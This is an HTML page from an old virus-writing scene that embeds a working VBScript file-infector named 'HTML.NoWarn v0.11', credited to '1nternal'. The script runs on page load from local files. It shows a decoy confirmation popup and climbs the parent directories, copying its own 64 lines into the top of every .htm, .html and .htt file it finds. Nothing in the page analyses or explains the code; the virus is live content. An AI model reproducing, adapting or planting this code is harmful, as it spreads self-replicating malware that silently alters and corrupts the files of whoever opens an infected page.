<!-- '"NorthSky"' -->
<!-- Auto Banner Insertion Begin -->
<div align=center><table border=0 cellpadding=0 cellspacing=0>
<tr><td><script><!--
var g=new Date(); g=g.getTime()%1000;
document.writeln('<iframe width=468 height=60 scrolling=no marginwidth=0 marginheight=0 frameborder=0 src=http://v0doo600.8k.com/cgi-bin/b/468/60/dXNlcmJhbm5lcg==/is/'+g+'/></iframe>');
//--></script><noscript><iframe width=468 height=60 scrolling=no marginwidth=0 marginheight=0 frameborder=0 src=http://v0doo600.8k.com/cgi-bin/b/468/60/dXNlcmJhbm5lcg==/in/954/></iframe></noscript></td></tr>
<tr><td><a href=http://v0doo600.8k.com/cgi-bin/fsbar target=_blank><img border=0 height=20 width=468 src=http://v0doo600.8k.com/cgi-bin/fsbar ismap></a></td></tr>
</table><br>
</div><!-- Auto Banner Insertion Complete THANK YOU -->
<html> <!--1nternal-->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
</head>
<BODY>
<script language="VBScript"><!--

Private fso, HostPath

Private Sub FindHTMVBS
	On Error Resume Next
	cpath = fso.GetParentFolderName(HostPath)
	Set folder = fso.GetFolder(cpath)
	While folder.IsRootFolder = false 
		Set folder = fso.GetFolder(cpath)
		Set fc = folder.Files
		cpath = fso.GetParentFolderName(cpath)
		For each Target in fc
			InfType = Lcase(Fso.GetExtensionName(Target.name))
			if InfType = "htm" or InfType = "html" or InfType = "htt" then
				Set fh = fso.opentextfile(Target.path, 1, true)
				TestString = fh.readline
				fh.close
				If TestString <> "<html> <!--1nternal-->" then
					TempFile = fso.GetTempName
					fso.CopyFile Target.path, TempFile
					Set fh = fso.opentextfile(Hostpath, 1, true)
					Set ft = fso.opentextfile(Target.path, 2, true)
					For I = 1 to 64
						ft.WriteLine fh.ReadLine
					Next
					fh.close
					Set fh = fso.opentextfile(TempFile, 1, true)
					Do While fh.AtEndOfStream <> True  
						ft.WriteLine fh.ReadLine
					Loop
					ft.close
					fh.close
					fso.DeleteFile TempFile
				End IF
			End If
		Next
	Wend
End Sub

Private Sub Window_Onload
	On Error Resume Next
	Randomize
	If location.protocol = "file:" AND (Int((6 * Rnd) + 1) = 1) then
		set wcover = window.open ("about:Are you sure you want to view the contents of this HTML document?", "", "top = 185, left = 227, height = 80, width = 335, toolbar=no, maximize=no, resizeable=no, status=no")
		Set fso = CreateObject("Scripting.FileSystemObject")
		wcover.close
		HostPath = Replace(location.href, "file:///", "")
		HostPath = Replace(HostPath, "/", "\")
		Call FindHTMVBS
		window.status = "HTML.NoWarn v0.11 /1nternal"
	end IF
End Sub
--></script>
</BODY>
</HTML>



<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
<title>HTML.NoWarn v0.11</title>
</head>

<body>

<p align="center">&nbsp;</p>

<p align="center">&nbsp;</p>

<p align="center"><strong>HTML.NoWarn v0.11</strong></p>

<p align="center">/ 1nternal</p>

<p align="center"><a
href="http://www.geocities.com/SiliconValley/Horizon/9386">1nternal's
VX Site</a></p>

<p>&nbsp;</p>
</body>
</html>
